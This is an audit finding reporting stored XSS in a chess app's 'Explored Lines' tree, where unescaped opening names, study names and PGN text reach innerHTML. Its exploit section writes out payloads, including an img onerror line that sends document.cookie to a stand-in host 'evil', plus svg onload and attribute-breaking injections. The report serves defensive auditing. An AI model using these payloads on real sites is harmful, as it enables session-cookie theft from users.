# SEC-02 — XSS in the Explored Lines tree: unescaped line name, ECO and study name into `innerHTML`
- **Severity:** critical
- **Type:** security
- **File:** frontend/scout.js
- **Line(s):** 1253-1310 (`renderTreeLines`), 1542-1562 (`_applyTreeBadges`), 95 (`getAllLines` name source)
- **Component:** OpeningScout.renderTreeLines / SessionLineTree.getAllLines
- **Repro script:** `audit/scripts/CODE4_tree_repro.js` (tree harness; XSS data-flow traced statically)
- **Detected by:** CODE-4

## Expected
Opening names, study names and PGN text rendered into the line cards must be
escaped or assigned via `textContent`. Study names are free-form user input
(`index.html:908`, `<input id="studyNewNameInput">` with no validation and no
length/charset restriction); opening names come from YouTube titles and PGN
`Event` headers.

## Actual
`renderTreeLines()` writes one giant `innerHTML` template per line card:

```js
// frontend/scout.js:1253-1280 (excerpt)
return `
    <div class="scout-var-card ${isActive ? 'active' : ''}" data-idx="${idx}">
        <div class="scout-var-header">
            <div style="display:flex; align-items:center; gap:0.4rem; overflow:hidden;">
                <span class="scout-var-badge">#${idx + 1}</span>
                <span style="font-weight:700; color:#fff; font-size:0.83rem; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">
                    ${line.name || 'Explored Line'}
                </span>
                ${line.eco ? `<span style="font-size:0.7rem; color:var(--accent-primary); font-weight:700;">${line.eco}</span>` : ''}
            </div>
            ...
        </div>
        <div class="scout-var-pgn" title="${line.pgn}">${line.pgn}</div>
        ...
            <span class="scout-line-study-name" style="...">
                ${lineStudy || '(No Study Assigned)'}
            </span>
```

and `_applyTreeBadges()` re-writes the badge strip on every debounced overlap
check with the same unescaped pattern (`title="${wData.message}"` at
lines 1545/1547/1549/1555/1557/1559).

Where the tainted values come from:

* `line.name` — `frontend/scout.js:95`:
  ```js
  name: node.lineName || lastMove?.opening_name || (path[0]?.opening_name) || 'Variation',
  ```
  For every **user-played** move, `opening_name` is stamped from the active
  study (`frontend/scout.js:695`):
  ```js
  opening_name: this.activeStudy?.opening_name || '',
  ```
  and `study.opening_name` is, for a YouTube source, literally the video title
  (`backend/scout.py:226`: `opening_name = title`) or, for a pasted PGN, the
  PGN `Event` header (`backend/scout.py:661` + `:722`:
  `main_name = g_title` where `g_title = game.headers.get("Event")`).
* `lineStudy` — `frontend/scout.js:1251`:
  ```js
  const lineStudy = line.studyName || this.currentStudy || '';
  ```
  `this.currentStudy` is whatever the user typed into the unvalidated
  "New Study Name" input and was persisted server-side, so this is a
  *stored* XSS that survives a reload.
* `line.pgn` — built from `m.san` (`scout.js:147-164`); SAN from the board is
  safe, but the regex-based sanitiser only strips a leading move number, so
  any non-SAN `san` string reaching the tree (e.g. a study variation object
  with a hand-built `san`) is rendered raw.

## Root cause
Same as SEC-01: unescaped `innerHTML` interpolation. `scout.js` has no
`escapeHtml`/text-node helper at all, and `_applyTreeBadges` duplicates the
badge markup a second time (see CODE-19) so any fix must be applied twice.

## Exploit / escalation
1. **Remote, zero-interaction:** upload a YouTube video whose *title* contains
   `<img src=x onerror=fetch('//evil/'+document.cookie)>`. The user opens
   Opening Scout, clicks the card, plays one move, and the payload fires from
   the tree panel (`${line.name}`).
2. **PGN `Event` header:** paste a PGN whose first tag is
   `[Event "<svg onload=alert(1)>"]`. `_analyze_raw_pgn` copies it into
   `main_name` → `study.opening_name` → every user move's `opening_name` →
   `line.name` → `innerHTML`.
3. **Stored/self-XSS escalation:** name a study `x" onmouseover="alert(1)`;
   the name is written to the DB, returned by `/api/repertoire/studies`, and
   re-rendered into every line card on every subsequent session.
4. Adjacent weaker variant: `_applyTreeBadges` puts server `message` strings
   into `title="..."` attributes (lines 1545-1559) and
   `renderTreeLines` does the same at 1204-1218; the backend
   `check_line_overlap` message embeds client-supplied SAN
   (`backend/repertoire.py:1113-1120`), so a crafted `san` is a second
   attribute-context injection.
